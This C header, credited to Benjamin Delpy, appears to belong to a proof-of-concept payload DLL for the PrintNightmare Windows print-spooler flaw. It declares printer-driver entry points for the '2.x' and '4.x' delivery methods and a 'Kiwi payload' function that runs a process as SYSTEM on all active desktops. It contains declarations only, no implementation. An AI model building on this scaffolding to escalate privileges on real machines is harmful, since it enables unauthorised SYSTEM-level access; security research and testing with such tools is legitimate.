/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include <windows.h>
#include <userenv.h>

//__pragma(comment(linker, "/export:DllCanUnloadNow=KyXPUI_orig.DllCanUnloadNow,PRIVATE"))
//__pragma(comment(linker, "/export:DllGetClassObject=KyXPUI_orig.DllGetClassObject,PRIVATE"))

#define LOGONID_CURRENT			((ULONG) -1)
#define SERVERHANDLE_CURRENT	((HANDLE) NULL)
#define MAX_THINWIRECACHE		4
#define WINSTATIONNAME_LENGTH	32
#define DOMAIN_LENGTH			17
#define USERNAME_LENGTH			20
typedef WCHAR WINSTATIONNAME[WINSTATIONNAME_LENGTH + 1];

typedef enum _WINSTATIONSTATECLASS {
	State_Active = 0,
	State_Connected = 1,
	State_ConnectQuery = 2,
	State_Shadow = 3,
	State_Disconnected = 4,
	State_Idle = 5,
	State_Listen = 6,
	State_Reset = 7,
	State_Down = 8,
	State_Init = 9
} WINSTATIONSTATECLASS;

#pragma warning(push)
#pragma warning(disable:4201)
typedef struct _SESSIONIDW {
	union {
		ULONG SessionId;
		ULONG LogonId;
	} DUMMYUNIONNAME;
	WINSTATIONNAME WinStationName;
	WINSTATIONSTATECLASS State;
} SESSIONIDW, * PSESSIONIDW;
#pragma warning(pop)

BOOLEAN WINAPI WinStationEnumerateW(IN HANDLE hServer, OUT PSESSIONIDW* SessionIds, OUT PULONG Count);
BOOLEAN WINAPI WinStationFreeMemory(IN PVOID Buffer);

typedef LONG_PTR(APIENTRY* PFN)();

typedef struct  _DRVFN {
	ULONG iFunc;
	PFN pfn;
} DRVFN, * PDRVFN;

typedef struct  tagDRVENABLEDATA {
	ULONG iDriverVersion;
	ULONG c;
	DRVFN* pdrvfn;
} DRVENABLEDATA, * PDRVENABLEDATA;

#define DRVQUERY_USERMODE 1

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

// PrintNightMare 2.x - via config file and/or "real driver"
VOID APIENTRY DrvResetConfigCache();
BOOL APIENTRY DrvQueryDriverInfo(DWORD dwMode, PVOID pBuffer, DWORD cbBuf, PDWORD pcbNeeded);
BOOL APIENTRY DrvEnableDriver(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded);
VOID APIENTRY DrvDisableDriver();

// PrintNightMare 3.x - via "real packaged driver" - NOT included (need WHQL signature - or pre-approved Authenticode)

// PrintNightMare 4.x - via CopyFiles
DWORD WINAPI GenerateCopyFilePaths(LPCWSTR pszPrinterName, LPCWSTR pszDirectory, LPBYTE pSplClientInfo, DWORD dwLevel, LPWSTR pszSourceDir, LPDWORD pcchSourceDirSize, LPWSTR pszTargetDir, LPDWORD pcchTargetDirSize, DWORD dwFlags);
BOOL WINAPI SpoolerCopyFileEvent(LPWSTR pszPrinterName, LPWSTR pszKey, DWORD dwCopyFileEvent);

// Kiwi payload - SYSTEM on all active desktop(s)
BOOL RunProcessForAll(LPWSTR szProcess);